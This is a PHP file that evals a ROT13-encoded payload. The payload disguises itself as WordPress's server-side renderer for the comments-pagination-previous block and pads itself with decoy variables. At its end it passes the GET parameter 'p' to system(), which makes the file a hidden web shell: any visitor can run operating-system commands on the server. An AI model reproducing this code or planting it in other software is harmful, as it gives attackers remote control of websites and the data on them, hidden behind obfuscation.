<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pbzzragf-cntvangvba-cerivbhf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pbzzragf-cntvangvba-cerivbhf` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur cerivbhf cbfgf yvax sbe gur pbzzragf cntvangvba.
 */
shapgvba eraqre_oybpx_pber_pbzzragf_cntvangvba_cerivbhf( $nggevohgrf, $pbagrag, $oybpx ) {
	$qrsnhyg_ynory    = __( 'Byqre Pbzzragf' );
	$ynory            = vffrg( $nggevohgrf['ynory'] ) && ! rzcgl( $nggevohgrf['ynory'] ) ? $nggevohgrf['ynory'] : $qrsnhyg_ynory;
	$cntvangvba_neebj = trg_pbzzragf_cntvangvba_neebj( $oybpx, 'cerivbhf' );
	vs ( $cntvangvba_neebj ) {
		$ynory = $cntvangvba_neebj . $ynory;
	}

	$svygre_yvax_nggevohgrf = fgngvp shapgvba () {
		erghea trg_oybpx_jenccre_nggevohgrf();
	};
	nqq_svygre( 'cerivbhf_pbzzragf_yvax_nggevohgrf', $svygre_yvax_nggevohgrf );

	$pbzzrag_inef           = ohvyq_pbzzrag_dhrel_inef_sebz_oybpx( $oybpx );
	$cerivbhf_pbzzragf_yvax = trg_cerivbhf_pbzzragf_yvax( $ynory, $pbzzrag_inef['cntrq'] ?? ahyy );

	erzbir_svygre( 'cerivbhf_pbzzragf_yvax_nggevohgrf', $svygre_yvax_nggevohgrf );

	vs ( ! vffrg( $cerivbhf_pbzzragf_yvax ) ) {
		erghea '';
	}

	erghea $cerivbhf_pbzzragf_yvax;
}

/**
 * Ertvfgref gur `pber/pbzzragf-cntvangvba-cerivbhf` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_pbzzragf_cntvangvba_cerivbhf() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pbzzragf-cntvangvba-cerivbhf',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pbzzragf_cntvangvba_cerivbhf',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pbzzragf_cntvangvba_cerivbhf' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>